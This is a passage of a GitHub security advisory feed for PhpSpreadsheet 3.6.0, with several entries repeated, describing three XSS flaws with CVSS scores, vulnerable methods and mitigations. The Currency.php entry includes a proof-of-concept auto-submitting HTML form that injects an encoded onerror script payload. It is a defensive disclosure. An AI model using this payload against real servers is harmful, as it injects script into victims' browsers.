<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56411">https://nvd.nist.gov/vuln/detail/CVE-2024-56411</a></li>
<li><a href="https://github.com/advisories/GHSA-hwcp-2h35-p66w">https://github.com/advisories/GHSA-hwcp-2h35-p66w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hwcp-2h35-p66w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:28:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header]]></title>
        <id>https://github.com/advisories/GHSA-hwcp-2h35-p66w</id>
        <link href="https://github.com/advisories/GHSA-hwcp-2h35-p66w"/>
        <updated>2025-01-03T19:24:57.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cross-site-scripting-xss-vulnerability-of-the-hyperlink-base-in-the-html-page-header">Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: the HTML page is formed without sanitizing the hyperlink base
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateHTMLHeader</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header in Phpspreadsheet.
The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 8. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.
The Excel file is unpacked and a HyperlinkBase in the file is inserted into the <code>docProps/app.xml</code> file.</p>
<p><img alt="fig14" src="https://github.com/user-attachments/assets/f68ef7fc-e78e-4424-8753-4318b6ff51c3"></p>
<p><em>Figure 14. Embedding the payload</em> </p>
<p>After the changes were made, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into the HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>
<p><img alt="fig15" src="https://github.com/user-attachments/assets/0aa7398c-ddd9-4c5a-ab04-41af0236dcba"></p>
<p><em>Figure 15. Generating the HTML page header using the HyperlinkBase property</em> </p>
<p>After generating and displaying the HTML representation of the XLSX file, arbitrary JavaScript code will be executed.
<img src="https://github.com/user-attachments/assets/c3694661-31e3-4be8-9a86-6eb4dd4647b5" alt="fig16" width="356"></p>
<p><em>Figure 16. Executing arbitrary JavaScript code</em> </p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56411">https://nvd.nist.gov/vuln/detail/CVE-2024-56411</a></li>
<li><a href="https://github.com/advisories/GHSA-hwcp-2h35-p66w">https://github.com/advisories/GHSA-hwcp-2h35-p66w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hwcp-2h35-p66w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:28:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability in custom properties]]></title>
        <id>https://github.com/advisories/GHSA-wv23-996v-q229</id>
        <link href="https://github.com/advisories/GHSA-wv23-996v-q229"/>
        <updated>2025-01-03T20:12:10.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cross-site-scripting-xss-vulnerability-in-custom-properties">Cross-Site Scripting (XSS) vulnerability in custom properties</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: the HTML page is generated without clearing custom properties
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateMeta</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in custom properties in Phpspreadsheet.
The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 9. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.
The Excel file is unpacked and a custom property in the file is inserted into the <code>docProps/custom.xml</code> file.</p>
<p><img alt="fig17" src="https://github.com/user-attachments/assets/65453b48-bca5-4f5c-a683-315a7bb1ab1f"></p>
<p><em>Figure 17. Embedding the payload</em></p>
<p>After making the changes, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into an HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>
<p><img alt="fig18" src="https://github.com/user-attachments/assets/e0f63bfb-d9e1-4c9d-a2a9-8a0a20406cdc"></p>
<p><em>Figure 18. Getting a custom property</em></p>
<p>When calling the static <code>generateMeta</code> method, you can see that the key of the custom property is displayed without sanitization.</p>
<p><img alt="fig19" src="https://github.com/user-attachments/assets/8c74e264-af68-4f62-8ac7-437e65884e86"></p>
<p><em>Figure 19. Getting a custom property</em></p>
<p>As a result, when viewing the excel file as the HTML representation, arbitrary JavaScript code will be executed.</p>
<img src="https://github.com/user-attachments/assets/a6ed21e3-685c-415c-b2dc-453bc0652bef" alt="fig20" width="356">

<p><em>Figure 20. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56410">https://nvd.nist.gov/vuln/detail/CVE-2024-56410</a></li>
<li><a href="https://github.com/advisories/GHSA-wv23-996v-q229">https://github.com/advisories/GHSA-wv23-996v-q229</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wv23-996v-q229</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:25:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability in custom properties]]></title>
        <id>https://github.com/advisories/GHSA-wv23-996v-q229</id>
        <link href="https://github.com/advisories/GHSA-wv23-996v-q229"/>
        <updated>2025-01-03T20:12:10.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cross-site-scripting-xss-vulnerability-in-custom-properties">Cross-Site Scripting (XSS) vulnerability in custom properties</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: the HTML page is generated without clearing custom properties
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateMeta</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in custom properties in Phpspreadsheet.
The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 9. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.
The Excel file is unpacked and a custom property in the file is inserted into the <code>docProps/custom.xml</code> file.</p>
<p><img alt="fig17" src="https://github.com/user-attachments/assets/65453b48-bca5-4f5c-a683-315a7bb1ab1f"></p>
<p><em>Figure 17. Embedding the payload</em></p>
<p>After making the changes, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into an HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>
<p><img alt="fig18" src="https://github.com/user-attachments/assets/e0f63bfb-d9e1-4c9d-a2a9-8a0a20406cdc"></p>
<p><em>Figure 18. Getting a custom property</em></p>
<p>When calling the static <code>generateMeta</code> method, you can see that the key of the custom property is displayed without sanitization.</p>
<p><img alt="fig19" src="https://github.com/user-attachments/assets/8c74e264-af68-4f62-8ac7-437e65884e86"></p>
<p><em>Figure 19. Getting a custom property</em></p>
<p>As a result, when viewing the excel file as the HTML representation, arbitrary JavaScript code will be executed.</p>
<img src="https://github.com/user-attachments/assets/a6ed21e3-685c-415c-b2dc-453bc0652bef" alt="fig20" width="356">

<p><em>Figure 20. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56410">https://nvd.nist.gov/vuln/detail/CVE-2024-56410</a></li>
<li><a href="https://github.com/advisories/GHSA-wv23-996v-q229">https://github.com/advisories/GHSA-wv23-996v-q229</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wv23-996v-q229</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:25:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability in custom properties]]></title>
        <id>https://github.com/advisories/GHSA-wv23-996v-q229</id>
        <link href="https://github.com/advisories/GHSA-wv23-996v-q229"/>
        <updated>2025-01-03T20:12:10.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cross-site-scripting-xss-vulnerability-in-custom-properties">Cross-Site Scripting (XSS) vulnerability in custom properties</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: the HTML page is generated without clearing custom properties
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateMeta</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in custom properties in Phpspreadsheet.
The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 9. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.
The Excel file is unpacked and a custom property in the file is inserted into the <code>docProps/custom.xml</code> file.</p>
<p><img alt="fig17" src="https://github.com/user-attachments/assets/65453b48-bca5-4f5c-a683-315a7bb1ab1f"></p>
<p><em>Figure 17. Embedding the payload</em></p>
<p>After making the changes, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into an HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>
<p><img alt="fig18" src="https://github.com/user-attachments/assets/e0f63bfb-d9e1-4c9d-a2a9-8a0a20406cdc"></p>
<p><em>Figure 18. Getting a custom property</em></p>
<p>When calling the static <code>generateMeta</code> method, you can see that the key of the custom property is displayed without sanitization.</p>
<p><img alt="fig19" src="https://github.com/user-attachments/assets/8c74e264-af68-4f62-8ac7-437e65884e86"></p>
<p><em>Figure 19. Getting a custom property</em></p>
<p>As a result, when viewing the excel file as the HTML representation, arbitrary JavaScript code will be executed.</p>
<img src="https://github.com/user-attachments/assets/a6ed21e3-685c-415c-b2dc-453bc0652bef" alt="fig20" width="356">

<p><em>Figure 20. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56410">https://nvd.nist.gov/vuln/detail/CVE-2024-56410</a></li>
<li><a href="https://github.com/advisories/GHSA-wv23-996v-q229">https://github.com/advisories/GHSA-wv23-996v-q229</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wv23-996v-q229</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:25:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability in custom properties]]></title>
        <id>https://github.com/advisories/GHSA-wv23-996v-q229</id>
        <link href="https://github.com/advisories/GHSA-wv23-996v-q229"/>
        <updated>2025-01-03T20:12:10.000Z</updated>
        <content type="html"><![CDATA[<h1 id="cross-site-scripting-xss-vulnerability-in-custom-properties">Cross-Site Scripting (XSS) vulnerability in custom properties</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)
<strong>Description</strong>: the HTML page is generated without clearing custom properties
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: class <code>PhpOffice\PhpSpreadsheet\Writer\Html</code>, method <code>generateMeta</code>
<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file
<strong>Mitigation</strong>: additional sanitization of special characters in a string
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in custom properties in Phpspreadsheet.
The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>
<p><em>Listing 9. Source code on the server</em></p>
<pre><code>&lt;?php

require __DIR__ . '/vendor/autoload.php';

$inputFileName = './doc/Book1.xlsx';
$spreadsheet = \PhpOffice\PhpSpreadsheet\IOFactory::load($inputFileName);
$writer = new \PhpOffice\PhpSpreadsheet\Writer\Html($spreadsheet);
print($writer-&gt;generateHTMLAll());
</code></pre>
<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.
The Excel file is unpacked and a custom property in the file is inserted into the <code>docProps/custom.xml</code> file.</p>
<p><img alt="fig17" src="https://github.com/user-attachments/assets/65453b48-bca5-4f5c-a683-315a7bb1ab1f"></p>
<p><em>Figure 17. Embedding the payload</em></p>
<p>After making the changes, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into an HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>
<p><img alt="fig18" src="https://github.com/user-attachments/assets/e0f63bfb-d9e1-4c9d-a2a9-8a0a20406cdc"></p>
<p><em>Figure 18. Getting a custom property</em></p>
<p>When calling the static <code>generateMeta</code> method, you can see that the key of the custom property is displayed without sanitization.</p>
<p><img alt="fig19" src="https://github.com/user-attachments/assets/8c74e264-af68-4f62-8ac7-437e65884e86"></p>
<p><em>Figure 19. Getting a custom property</em></p>
<p>As a result, when viewing the excel file as the HTML representation, arbitrary JavaScript code will be executed.</p>
<img src="https://github.com/user-attachments/assets/a6ed21e3-685c-415c-b2dc-453bc0652bef" alt="fig20" width="356">

<p><em>Figure 20. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56410">https://nvd.nist.gov/vuln/detail/CVE-2024-56410</a></li>
<li><a href="https://github.com/advisories/GHSA-wv23-996v-q229">https://github.com/advisories/GHSA-wv23-996v-q229</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wv23-996v-q229</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-01-03T17:25:45.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows unauthorized Reflected XSS in Currency.php file]]></title>
        <id>https://github.com/advisories/GHSA-j2xg-cjcx-4677</id>
        <link href="https://github.com/advisories/GHSA-j2xg-cjcx-4677"/>
        <updated>2025-01-03T19:17:19.000Z</updated>
        <content type="html"><![CDATA[<h1 id="unauthorized-reflected-xss-in-currencyphp-file">Unauthorized Reflected XSS in <code>Currency.php</code> file</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)
<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)
<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> script, an attacker can perform XSS-type attack
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file
<strong>Exploitation conditions</strong>: an unauthorized user
<strong>Mitigation</strong>: sanitization of the <code>currency</code> variable
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Currency.php</code> file) in Phpspreadsheet.</p>
<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file, which leads to the possibility of a XSS attack.
Strings are formed using the <code>currency</code> parameter without sanitization, controlled by an attacker.</p>
<p><img alt="fig9" src="https://github.com/user-attachments/assets/dfac3fbf-de42-42af-8163-b76f0c54da6c"></p>
<p><em>Figure 9.  A fragment of the query in which a string and a parameter are formed without sanitization</em></p>
<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>
<p><em>Listing 5. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
    &lt;form action="https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php" method="POST"&gt;
      &lt;input type="hidden" name="number" value="1234&amp;#46;5678" /&gt;
      &lt;input type="hidden" name="currency" value="&amp;#36;&amp;apos;&amp;quot;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;" /&gt;
      &lt;input type="hidden" name="decimals" value="2" /&gt;
      &lt;input type="hidden" name="position" value="1" /&gt;
      &lt;input type="hidden" name="spacing" value="0" /&gt;
      &lt;input type="hidden" name="submit" value="Display&amp;#32;Mask" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      history.pushState('', '', '/');
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>After sending the script provided in Listing 5, the XSS vulnerability is exploited. Figure 10 shows the execution of arbitrary JavaScript code during the submission of a POST form. </p>
<img src="https://github.com/user-attachments/assets/2be8c94b-03ac-40d9-aa7a-9d326eb79335" alt="fig10" width="428">

<p><em>Figure 10. Executing arbitrary JavaScript code</em></p>
<h1 id="credit">Credit</h1>
<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-j2xg-cjcx-4677</a></li>
<li><a href="https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4">https://github.com/PHPOffice/PhpSpreadsheet/commit/700a80346be269af668914172bc6f4521982d0b4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56409">https://nvd.nist.gov/vuln/detail/CVE-2024-56409</a></li>
<li><a href="https://github.com/advisories/GHSA-j2xg-cjcx-4677">https://github.com/advisories/GHSA-j2xg-cjcx-4677</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j2xg-cjcx-4677</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-03T17:06:51.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[phpoffice/phpspreadsheet] PhpSpreadsheet allows unauthorized Reflected XSS in Currency.php file]]></title>
        <id>https://github.com/advisories/GHSA-j2xg-cjcx-4677</id>
        <link href="https://github.com/advisories/GHSA-j2xg-cjcx-4677"/>
        <updated>2025-01-03T19:17:19.000Z</updated>
        <content type="html"><![CDATA[<h1 id="unauthorized-reflected-xss-in-currencyphp-file">Unauthorized Reflected XSS in <code>Currency.php</code> file</h1>
<p><strong>Product</strong>: Phpspreadsheet
<strong>Version</strong>: version 3.6.0
<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
<strong>CVSS vector v.3.1</strong>: 8.2 (AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:H/A:N)
<strong>CVSS vector v.4.0</strong>: 8.3 (AV:N/AC:L/AT:N/PR:N/UI:A/VC:N/VI:H/VA:N/SC:L/SI:H/SA:L)
<strong>Description</strong>: using the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> script, an attacker can perform XSS-type attack
<strong>Impact</strong>: executing arbitrary JavaScript code in the browser
<strong>Vulnerable component</strong>: the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file
<strong>Exploitation conditions</strong>: an unauthorized user
<strong>Mitigation</strong>: sanitization of the <code>currency</code> variable
<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>
<h1 id="research">Research</h1>
<p>The researcher discovered zero-day vulnerability Unauthorized Reflected Cross-Site Scripting (XSS) (in <code>Currency.php</code> file) in Phpspreadsheet.</p>
<p>There is no sanitization in the <code>/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php</code> file, which leads to the possibility of a XSS attack.
Strings are formed using the <code>currency</code> parameter without sanitization, controlled by an attacker.</p>
<p><img alt="fig9" src="https://github.com/user-attachments/assets/dfac3fbf-de42-42af-8163-b76f0c54da6c"></p>
<p><em>Figure 9.  A fragment of the query in which a string and a parameter are formed without sanitization</em></p>
<p>An attacker can prepare a special HTML form that will be automatically sent to the vulnerable scenario.</p>
<p><em>Listing 5. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>
<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
    &lt;form action="https://192.***.***.***/vendor/phpoffice/phpspreadsheet/samples/Wizards/NumberFormat/Currency.php" method="POST"&gt;
      &lt;input type="hidden" name="number" value="1234&amp;#46;5678" /&gt;
      &lt;input type="hidden" name="currency" value="&amp;#36;&amp;apos;&amp;quot;&amp;lt;img&amp;#32;src&amp;#61;1&amp;#32;onerror&amp;#61;alert&amp;#40;&amp;#41;&amp;gt;" /&gt;
      &lt;input type="hidden" name="decimals" value="2" /&gt;
      &lt;input type="hidden" name="position" value="1" /&gt;
      &lt;input type="hidden" name="spacing" value="0" /&gt;
      &lt;input type="hidden" name="submit" value="Display&amp;#32;Mask" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
